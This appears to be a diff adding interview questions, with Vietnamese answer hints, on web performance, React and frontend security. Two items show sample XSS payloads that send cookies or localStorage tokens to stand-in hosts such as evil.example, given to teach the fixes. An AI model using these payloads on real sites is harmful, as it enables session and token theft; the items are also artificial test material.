+      - Ít weight/biến thể; variable font.
+      `next/font` tự làm self-host + fallback metric.
+    followUp: Why does a preloaded font need the `crossorigin` attribute even on the same origin?
+    tags: [fonts, cls, lcp]
+  - id: browser-web-perf-026
+    level: hard
+    type: debug
+    q: A CMS-driven product description component was flagged in a security review. What is the vulnerability and how do you fix it?
+    example: |-
+      ```tsx
+      function ProductDescription({ html }: { html: string }) {
+        // html comes from merchant-editable rich text in the CMS
+        return <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />;
+      }
+      ```
+    hint: |-
+      **Stored XSS**: merchant (hoặc tài khoản merchant bị chiếm) lưu `<img src=x onerror="fetch('//evil?c='+document.cookie)">` → chạy trong origin của shop cho mọi khách xem.
+      Fix nhiều lớp:
+      - Sanitize bằng **DOMPurify** (hoặc sanitize-html phía server) với allowlist tag/attribute; sanitize **lúc render** (hoặc cả lúc lưu, giữ bản gốc).
+      - Tốt hơn: lưu rich text dạng cấu trúc (Markdown/JSON AST) và render bằng component, không render HTML thô.
+      - CSP strict (nonce) để payload inline không chạy; **Trusted Types** (`require-trusted-types-for 'script'`) buộc mọi gán `innerHTML` đi qua policy.
+      - Cookie session `HttpOnly`.
+    followUp: DOMPurify output is later passed through another string transformation before rendering. Why can that reintroduce XSS?
+    redFlags:
+      - Escapes `<script>` tags with a regex and considers it safe
+    tags: [xss, react, sanitization, debug]
+  - id: browser-web-perf-027
+    level: hard
+    type: debug
+    q: Users can set a "website" link on their profile, rendered like this. What can go wrong, and what does React itself do about it?
+    example: |-
+      ```tsx
+      function ProfileLink({ url }: { url: string }) {
+        return <a href={url} target="_blank">Visit website</a>;
+      }
+      // url = "javascript:fetch('https://evil.example/?t='+localStorage.token)"
+      ```
+    hint: |-
+      URL scheme `javascript:` trong `href` chạy code khi click → XSS dù JSX escape text.
+      React: 16.9+ **cảnh báo**; React 19 **chặn** `javascript:` URL trong các thuộc tính URL (thay bằng URL an toàn ném lỗi khi bị kích hoạt). Nhưng đừng dựa vào framework: còn `data:`, `vbscript:`, và các sink khác (`window.location = url`, `iframe src`).
+      Fix: parse bằng `new URL(url)` và **allowlist** protocol `http:`/`https:` (validate cả khi lưu ở server), hiển thị domain cho user.
+      `target="_blank"`: browser hiện đại mặc định `noopener`; vẫn nên thêm `rel="noopener noreferrer"` cho browser cũ và để không lộ referrer.
+    followUp: Where else in a React app do user-controlled URLs flow into dangerous sinks?
+    tags: [xss, react, urls, debug]
+    verify: true
+  - id: browser-web-perf-028
+    level: hard
+    type: debug
+    q: After every deploy, some users get a blank page with `ChunkLoadError` or `Failed to fetch dynamically imported module`. Here is the nginx config. Diagnose it.
+    example: |-
+      ```nginx
+      location / {
+        try_files $uri /index.html;
+        add_header Cache-Control "public, max-age=86400";
+      }
+      # deploy script: rm -rf /var/www/app/* && cp -r dist/* /var/www/app/
+      ```
+    hint: |-
+      - `index.html` bị cache 1 ngày (browser + CDN) → trỏ tới chunk hash **cũ**.
+      - Deploy **xoá** chunk cũ → tab đang mở (hoặc HTML cache) lazy-load chunk cũ → 404; tệ hơn, `try_files` trả **index.html với status 200** cho URL `.js` không tồn tại → lỗi MIME/parse khó hiểu.
+      Fix:
+      - `index.html`: `Cache-Control: no-cache`; asset hashed: `max-age=31536000, immutable`.
+      - Không xoá asset cũ ngay: giữ vài bản deploy (upload lên object storage/CDN theo hash).
+      - Không fallback SPA cho đường dẫn asset (`/assets/` trả 404 thật).
+      - Client: Error Boundary bắt chunk error → reload một lần (chống vòng lặp reload).
+    followUp: How would you detect this in production before users complain?
+    tags: [caching, deploy, code-splitting, debug]
+  - id: browser-web-perf-029
+    level: hard
+    type: debug
+    q: Typing in this transaction search box has an INP of ~600ms on mid-range Android phones. Find the problems and fix them.
+    example: |-
+      ```tsx
+      function TransactionSearch({ transactions }: { transactions: Tx[] }) { // ~10,000 items
+        const [q, setQ] = useState('');
+        const filtered = transactions
+          .filter((t) => JSON.stringify(t).toLowerCase().includes(q.toLowerCase()))
+          .sort((a, b) => b.date.localeCompare(a.date));
+        return (
+          <>
+            <input value={q} onChange={(e) => setQ(e.target.value)} />
+            {filtered.map((t) => <TxRow key={t.id} tx={t} />)}
+          </>
+        );
+      }
+      ```
+    hint: |-
+      Mỗi phím: filter 10k item với `JSON.stringify` (rất đắt), sort lại, render **hàng nghìn** `TxRow` → processing + presentation delay lớn.
+      Fix:
+      - Precompute search key một lần (`useMemo` trên `transactions`), sort một lần khi data đổi.
+      - Tách urgent vs non-urgent: input cập nhật ngay, list dùng `useDeferredValue(q)` hoặc `startTransition` → React có thể ngắt render list.
+      - **Virtualize** list (react-window/TanStack Virtual) → chỉ render ~20 row nhìn thấy.
+      - `React.memo(TxRow)` với props ổn định.
+      - Dữ liệu rất lớn: filter trong Web Worker hoặc server-side search có debounce.
+      Đo lại bằng Performance panel + web-vitals attribution.
+    followUp: Why does `useDeferredValue` help INP even though the total work is the same?
+    tags: [inp, react, performance, debug]
+  - id: browser-web-perf-030
+    level: hard
+    type: debug
+    q: The product page has a CLS of 0.32 in the field. Here is the markup. What shifts, and how do you fix it?
+    example: |-
+      ```html
+      <header>...</header>
+      <div id="promo-banner"></div>          <!-- filled by JS after an API call -->
+      <img src="/p/991-hero.jpg" alt="Keyboard" class="hero">  <!-- no width/height -->
+      <h1 style="font-family: 'BrandFont'">Mechanical Keyboard</h1>
+      <div id="reviews"></div>                <!-- rendered after hydration -->
+      ```
+    hint: |-
+      - `#promo-banner` rỗng rồi được chèn nội dung → đẩy toàn bộ trang xuống. Fix: reserve chiều cao (`min-height`) hoặc render từ server, hoặc overlay.
+      - `<img>` không có kích thước → chiếm 0px tới khi tải xong. Fix: `width`/`height` hoặc CSS `aspect-ratio`.
+      - Web font swap đổi chiều cao dòng tiêu đề. Fix: fallback font có `size-adjust`, preload font, `font-display: optional`.
+      - `#reviews` ở dưới fold thường ít ảnh hưởng nhưng nếu nằm trên nội dung khác thì cần skeleton đúng kích thước.
+      Ảnh hero còn là ứng viên LCP → thêm `fetchpriority="high"`.
+    followUp: How can you find which elements shifted using the Layout Instability API?
+    tags: [cls, debug]
+  - id: browser-web-perf-031
+    level: hard
+    type: scenario
+    q: LCP on the home page regressed from 2.1s to 3.8s at p75 right after marketing added a tag manager with A/B testing. How do you investigate and what do you negotiate?
+    hint: |-
+      Điều tra: so RUM trước/sau theo thiết bị; WebPageTest/DevTools: script A/B testing thường **đồng bộ trong `<head>`** và **ẩn trang** (anti-flicker snippet `opacity: 0` tới khi experiment load, timeout vài giây) → LCP bị chặn trực tiếp; thêm long task và bandwidth cạnh tranh ảnh hero.
+      Giải pháp:
+      - A/B test phía server/edge (không flicker, không block).
+      - Nếu phải client: giảm timeout anti-flicker, chỉ áp dụng trên trang có experiment.
+      - Load tag manager `async`, trì hoãn tag không quan trọng tới sau load/tương tác; Partytown/web worker cho third-party.
+      - Governance: performance budget cho third-party, review tag mới, dashboard theo thời gian.
+    followUp: How do you make the business case to marketing using data rather than opinions?
+    tags: [lcp, third-party, scenario]
+  - id: browser-web-perf-032
+    level: hard
+    type: scenario
+    q: After you shipped a PWA, a bug fix was deployed but some users still run the old version days later. Why, and how do you fix the update flow?
+    hint: |-
+      Nguyên nhân có thể:
+      - SW precache HTML + JS cache-first; SW mới đã install nhưng **waiting** vì user không bao giờ đóng hết tab (app mobile "add to home screen" chạy lâu).
+      - File SW bị HTTP cache/CDN cache (dù browser bỏ qua HTTP cache cho SW script, CDN vẫn có thể trả bản cũ).
+      - Precache manifest không đổi (build không đổi revision).
+      Fix:
+      - Lắng nghe `registration.waiting` / `updatefound` → hiện toast "Có bản mới" → `postMessage('SKIP_WAITING')` → reload khi `controllerchange`.
+      - Gọi `registration.update()` định kỳ/khi app focus.
+      - `Cache-Control: no-cache` cho `sw.js` ở CDN; network-first cho HTML.
+      - Kill switch: deploy SW mới gọi `self.registration.unregister()` + xoá cache nếu cần thoát hiểm.
+    followUp: What risks does calling `skipWaiting()` unconditionally introduce?
+    tags: [service-worker, pwa, deploy, scenario]
+  - id: browser-web-perf-033
+    level: hard
+    type: gotcha
+    q: When do `useMemo`, `useCallback` and `React.memo` actually improve performance, and when are they useless or harmful?
+    hint: |-
+      Có ích khi: tính toán thật sự đắt với input ổn định; giữ **identity** ổn định cho prop truyền vào component đã `memo` hoặc dependency của effect; list lớn với item memo.
+      Vô dụng khi: component con không `memo` (vẫn re-render); prop object/inline function mới mỗi render phá memo; tính toán rẻ (chi phí so dependency + bộ nhớ lớn hơn lợi ích).
+      Có hại: dependency sai → dữ liệu stale; code khó đọc; che giấu vấn đề kiến trúc (state đặt quá cao — nên đưa state xuống/tách component, dùng children prop).
+      React Compiler (stable từ 2025) tự memo hoá nhiều trường hợp → memo thủ công ít cần hơn; đo bằng React Profiler trước khi thêm.
+    followUp: Show how moving state down or using the `children` prop avoids re-renders without any memoization.
+    tags: [react, memoization, performance]
+    verify: true
+  - id: browser-web-perf-034
+    level: hard
+    type: concept
+    q: What is the current state of third-party cookies across browsers, and how should an embedded widget or cross-site login flow be designed today?
+    hint: |-
+      - Safari (ITP) và Firefox (Total Cookie Protection) **chặn/partition** third-party cookie mặc định từ lâu.
+      - Chrome: năm 2024 bỏ kế hoạch deprecate, 04/2025 bỏ luôn prompt lựa chọn, 10/2025 **retire phần lớn Privacy Sandbox APIs** (Topics, Protected Audience, Attribution Reporting...) → third-party cookie vẫn bật mặc định (user có thể chặn; Incognito chặn). Giữ lại CHIPS, FedCM...
+      - Thiết kế đúng: không phụ thuộc third-party cookie — SSO bằng **top-level redirect** (OIDC) thay vì iframe silent auth; widget nhúng dùng `Partitioned` cookie (CHIPS) hoặc token truyền qua `postMessage`; Storage Access API khi thật sự cần.
+      - Storage (localStorage, IndexedDB) trong iframe third-party cũng bị **partition** theo top-level site.
+    followUp: Why does silent token renewal in a hidden iframe break in Safari, and what replaces it?
+    redFlags:
+      - "Chrome has fully blocked third-party cookies since 2024"
+    tags: [cookies, privacy, third-party]
+    verify: true
+  - id: browser-web-perf-035
+    level: hard
+    type: concept
+    q: What are Trusted Types and how do they complement CSP against DOM-based XSS?
+    hint: |-
+      CSP chặn script **từ nguồn lạ**; DOM XSS xảy ra khi code của chính bạn đưa chuỗi vào **sink** (`innerHTML`, `outerHTML`, `document.write`, `eval`, `script.src`).
+      `Content-Security-Policy: require-trusted-types-for 'script'` → browser **từ chối string thường** ở các sink đó; chỉ nhận object `TrustedHTML/TrustedScript/TrustedScriptURL` tạo từ policy (`trustedTypes.createPolicy('app', { createHTML: (s) => DOMPurify.sanitize(s) })`).
+      Lợi ích: gom mọi chỗ nguy hiểm về vài policy dễ audit; rollout bằng report-only.
+      Hỗ trợ: Chromium từ lâu; các engine khác bổ sung gần đây — kiểm tra hỗ trợ hiện tại; có polyfill/fallback.
+    followUp: Which third-party libraries typically break when you enforce Trusted Types, and how do you handle them?
+    tags: [trusted-types, csp, xss]
+    verify: true
+  - id: browser-web-perf-036
+    level: hard
+    type: gotcha
+    q: What is the back/forward cache (bfcache), and what commonly makes a page ineligible?
+    hint: |-
+      bfcache giữ **snapshot toàn bộ trang trong memory** khi user rời đi → Back/Forward hiển thị tức thì (LCP ~0, không chạy lại JS).
+      Thường làm mất eligibility: handler `unload` (đang bị Chrome deprecate — dùng `pagehide`/`visibilitychange`), kết nối đang mở (WebSocket/WebRTC/IndexedDB transaction dở), `window.opener` references; `Cache-Control: no-store` trên HTML trong lịch sử chặn bfcache (Chrome đang thay đổi hành vi này cho một số trường hợp — kiểm tra hiện tại).
+      Code phải xử lý `pageshow` với `event.persisted === true` để làm mới dữ liệu nhạy cảm (giỏ hàng, số dư).
+      Kiểm tra: DevTools → Application → Back/forward cache.
+    followUp: For a banking app, is bfcache a security concern? How do you handle it?
+    tags: [bfcache, navigation, performance]
+    verify: true
+  - id: browser-web-perf-037
+    level: hard
+    type: scenario
+    q: A long-running dashboard SPA gets slower over hours and the tab eventually crashes. How do you find the memory leak?
+    hint: |-
+      Tái hiện: lặp một hành động (mở/đóng modal, đổi route) N lần.
+      DevTools Memory: **heap snapshot** trước/sau, chế độ Comparison → tìm constructor tăng mãi; "Detached DOM elements"; Allocation timeline.
+      Thủ phạm hay gặp: `setInterval`/listener (`window`, `resize`, WebSocket) không cleanup trong `useEffect` return; subscription (store, observable) không unsubscribe; cache/memo global không giới hạn (Map lớn dần); closure giữ DOM đã unmount; thư viện chart không `destroy()`.
+      Fix + thêm test: `performance.memory`/`measureUserAgentSpecificMemory` (nơi hỗ trợ) trong RUM để theo dõi xu hướng.
+    followUp: Why can a closure in an event listener keep an entire React subtree alive?
+    tags: [memory-leak, devtools, scenario]
+  - id: browser-web-perf-038
+    level: hard
+    type: concept
+    q: How do you break up a long task on the main thread, and why does `setTimeout(0)` chunking hurt some interactions?
+    hint: |-
+      Long task > 50ms chặn input → INP tệ. Chia việc thành nhiều phần và **yield** về main thread giữa các phần để browser xử lý input/render.
+      Cách yield: `await new Promise(r => setTimeout(r, 0))` (continuation xếp **cuối hàng đợi**, có thể bị task khác chen, và browser kẹp delay tối thiểu ~4ms khi lồng nhiều cấp); `scheduler.yield()` (Chromium mới) giữ **ưu tiên** cho continuation; `requestIdleCallback` cho việc không gấp; `isInputPending` (cũ).
+      Ưu tiên việc hiển thị trước (update UI), đẩy việc phụ (analytics, log) sau.
+      Nặng thật (parse, crypto, CSV lớn) → Web Worker.
+    example: |-
+      ```ts
+      async function processInChunks<T>(items: T[], fn: (t: T) => void) {
+        let deadline = performance.now() + 40;
+        for (const it of items) {
+          fn(it);
+          if (performance.now() > deadline) {
+            await ('scheduler' in globalThis && 'yield' in (globalThis as any).scheduler
+              ? (globalThis as any).scheduler.yield()
+              : new Promise((r) => setTimeout(r, 0)));
+            deadline = performance.now() + 40;
+          }
+        }
+      }
+      ```
+    followUp: When would you move the work into a Web Worker instead of chunking it?
+    tags: [long-tasks, inp, main-thread]
+    verify: true
+  - id: browser-web-perf-039
+    level: senior
+    type: design
+    q: Design a performance program for a large frontend — budgets, CI gates, RUM, and ownership.
+    hint: |-
+      - **Mục tiêu** theo field p75 (LCP/INP/CLS) cho trang quan trọng (home, PLP, PDP, checkout), tách mobile/desktop.
+      - **Budget**: JS/CSS kích thước theo route, số request, LCP lab; CI (Lighthouse CI, size-limit, bundle analyzer diff trên PR) fail/cảnh báo khi vượt.
+      - **RUM**: `web-vitals` với attribution → analytics; dashboard theo route/release/thiết bị; alert khi regression sau deploy.
+      - **Third-party governance**: review, budget riêng, load có điều kiện.
+      - **Ownership**: mỗi team sở hữu trang; perf là tiêu chí definition-of-done; post-mortem khi regression.
+      - Kết nối business: conversion/bounce theo nhóm LCP.
+    followUp: A PR adds 80KB of JS but the feature is important to the business. How does your process handle it?
+    tags: [performance, process, design]
+  - id: browser-web-perf-040
+    level: senior
+    type: design
+    q: How would you roll out a strict Content Security Policy to a large existing application without breaking production?
+    hint: |-
+      1. Inventory: inline script/style, `eval`, third-party, inline event handler.
+      2. Bật **`Content-Security-Policy-Report-Only`** với policy mục tiêu (nonce + `strict-dynamic`), thu report (`report-to`) vào endpoint/tool, phân loại.
+      3. Refactor: bỏ `onclick=` inline, chuyển inline script thành file hoặc có nonce, thay `eval`/`new Function`.
+      4. Server sinh nonce mỗi response (SSR/middleware); cache HTML cần lưu ý (nonce không được cache chung).
+      5. Enforce từng phần (trang ít rủi ro trước), giữ report-only cho policy chặt hơn tiếp theo (Trusted Types).
+      6. Monitor report sau enforce; quy trình cho team marketing thêm tag.
+    followUp: How do nonces interact with a CDN that caches your HTML?
+    tags: [csp, security, rollout]
+  - id: browser-web-perf-041
+    level: senior
+    type: open
+    q: For a large e-commerce storefront, how do you decide between CSR, SSR, SSG/ISR and streaming, from a performance point of view?
+    hint: |-
+      - **SSG/ISR**: trang ít cá nhân hoá (PDP, category) → HTML từ CDN, TTFB/LCP tốt nhất; khó với giá/tồn kho theo user → tách phần động (client fetch hoặc streaming).
+      - **SSR/streaming**: trang cá nhân hoá, SEO; stream shell sớm + Suspense cho phần chậm → LCP sớm dù có API chậm.
+      - **CSR**: khu vực sau đăng nhập, dashboard tương tác nặng.
+      - Chi phí ẩn: **hydration** (JS vẫn phải tải & chạy) → INP; React Server Components giảm JS gửi xuống.
+      - Quyết định theo từng route, đo field data; cache ở edge theo tenant/locale (key cẩn thận).
+    followUp: How does per-tenant pricing complicate CDN caching of server-rendered product pages?
+    tags: [rendering, ssr, architecture, open]
+  - id: browser-web-perf-042
+    level: senior
+    type: design
+    q: You are responsible for the frontend security baseline of a banking SPA. What goes into it?
+    hint: |-
+      - **Headers**: strict CSP (+ Trusted Types), HSTS (preload), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`, `Permissions-Policy`.
+      - **Auth**: token không ở Web Storage; BFF + cookie `__Host-`, `HttpOnly`, `Secure`, `SameSite`; CSRF token; session timeout + re-auth cho giao dịch (step-up).
+      - **Caching**: `no-store` cho response chứa dữ liệu tài khoản; xử lý bfcache (`pageshow`).
+      - **Dependencies**: lockfile, audit, SRI cho script CDN, hạn chế third-party trên trang giao dịch.
+      - **Code**: cấm `dangerouslySetInnerHTML` qua lint, sanitize, validate URL.
+      - **Monitoring**: CSP report, error tracking không log PII/token.
+    followUp: Why would you avoid third-party analytics scripts on the transfer confirmation page specifically?
+    tags: [security, banking, design]
+  - id: browser-web-perf-043
+    level: cv
+    type: behavioral
+    q: On the banking React SPA you applied code splitting and lazy loading. How did you choose the split points, and how did you measure the result?
+    hint: |-
+      Câu trả lời mạnh:
+      - Phân tích bundle trước (analyzer) — thứ gì lớn và không cần ở màn hình đầu (chart, PDF, thư viện date/i18n, module ít dùng) (điền chi tiết thật của bạn).
+      - Split theo route + component nặng; prefetch route hay dùng; Error Boundary cho chunk lỗi.
+      - Đo: kích thước JS initial, LCP/TTI hoặc INP trên thiết bị thật, Lighthouse lab + RUM nếu có (điền số liệu thật của bạn).
+      - Trade-off: số chunk, waterfall, độ trễ khi chuyển route.
+    followUp: What was the one split that gave the biggest win, and why?
+    redFlags:
+      - "We lazy-loaded every component"
+      - No before/after numbers or measurement method
+    tags: [cv, code-splitting, performance]
+  - id: browser-web-perf-044
+    level: cv
+    type: behavioral
+    q: You used memoization in that banking SPA. Give me one case where it fixed a real performance problem and one where it did not help.
+    hint: |-
+      Câu trả lời mạnh:
+      - Case thành công: vấn đề cụ thể (list giao dịch re-render khi đổi filter, context value mới mỗi render…), cách chứng minh bằng React Profiler, fix (`React.memo` + props ổn định, `useMemo` cho selector) (điền ví dụ thật của bạn).
+      - Case không giúp: memo trên component rẻ, hoặc prop inline phá memo; giải pháp đúng là tách state/virtualize.
+      - Bài học: đo trước, memo có chi phí; React Compiler thay đổi cách làm hiện nay.
+    followUp: How did you prevent a Context provider from re-rendering the whole app on every change?
+    tags: [cv, react, memoization]
+  - id: browser-web-perf-045
+    level: cv
+    type: behavioral
+    q: On the multi-tenant e-commerce storefront built with React/Next.js, what did you do to improve Core Web Vitals on product and checkout pages?
+    hint: |-
+      Nội dung mạnh (chỉ nói điều đã làm thật):
+      - Chỉ số nào tệ và đo bằng gì (CrUX/RUM/Lighthouse) (điền số liệu thật của bạn).
+      - LCP: ảnh sản phẩm (`next/image` với `sizes`, preload/priority), SSR/ISR, CDN.
+      - INP: giảm JS client (server components/lazy), tối ưu handler add-to-cart/address form.
+      - CLS: kích thước ảnh, banner/promo, font.
+      - Checkout: không cache dữ liệu nhạy cảm, third-party payment script tải có kiểm soát.
+      - Kết quả và tác động business nếu có (điền số liệu thật của bạn).
+    followUp: How did tenant-specific themes or third-party scripts complicate this?
+    tags: [cv, core-web-vitals, nextjs]
+  - id: browser-web-perf-046
+    level: cv
+    type: behavioral
+    q: How was authentication state stored in the banking SPA you worked on, and what would you change today?
+    hint: |-
+      Câu trả lời mạnh:
+      - Mô tả đúng cách làm thật (token ở đâu, refresh thế nào, timeout phiên) — không cần đẹp, cần trung thực (điền chi tiết thật của bạn).
+      - Phân tích rủi ro: XSS đọc được Web Storage, CSRF với cookie, token trong URL/log.
+      - Cải tiến: BFF + `HttpOnly` cookie, CSP strict, step-up auth cho giao dịch, `no-store` cho dữ liệu tài khoản.
+      - Nói về ràng buộc thực tế (backend có sẵn, yêu cầu ngân hàng, audit).
+    followUp: How would you migrate from localStorage tokens to a BFF without logging every user out?
+    tags: [cv, auth, security]
+  - id: browser-web-perf-047
+    level: medium
+    type: compare
+    q: What is the difference between reflow (layout), repaint and compositing, and which CSS changes trigger each?
+    hint: |-
+      - **Layout (reflow)**: tính lại hình học — đổi `width`, `height`, `top`, `margin`, font-size, thêm/xoá DOM, đọc `offsetHeight` sau khi ghi. Đắt nhất, có thể lan cả cây.
+      - **Paint**: vẽ lại pixel không đổi hình học — `color`, `background`, `box-shadow`, `visibility`.
+      - **Composite only**: `transform`, `opacity` (trên layer riêng) → GPU ghép, không layout/paint → animation mượt 60fps.
+      Dùng `will-change` có chừng mực (mỗi layer tốn memory). DevTools: Rendering → Paint flashing, Layers panel.
+    followUp: Why can promoting too many elements to their own layers hurt performance?
+    tags: [rendering, layout, paint]
+  - id: browser-web-perf-048
+    level: cv
+    type: scenario
+    q: In your banking SPA with lazy-loaded routes, what happened when a chunk failed to load (flaky mobile network or a deploy mid-session), and how did you handle it?
+    hint: |-
+      Nội dung mạnh:
+      - Hiện tượng: `ChunkLoadError`/màn hình trắng khi chuyển route; nguyên nhân mạng yếu vs deploy xoá chunk cũ (điền trường hợp thật của bạn).
+      - Xử lý client: Error Boundary quanh `Suspense` route, retry `import()` có backoff, reload một lần có guard (sessionStorage flag) chống vòng lặp, thông báo thân thiện.
+      - Xử lý hạ tầng: `index.html` `no-cache`, asset hashed `immutable`, giữ chunk cũ sau deploy.
+      - Giám sát: error tracking nhóm theo loại lỗi chunk, tỉ lệ trước/sau fix (điền số liệu thật của bạn).
+      - Với app ngân hàng: không mất dữ liệu form giao dịch khi reload (lưu nháp an toàn, không lưu dữ liệu nhạy cảm).
+    followUp: If the user is halfway through a transfer form when a new version is deployed, what should the app do?
+    tags: [cv, code-splitting, resilience]
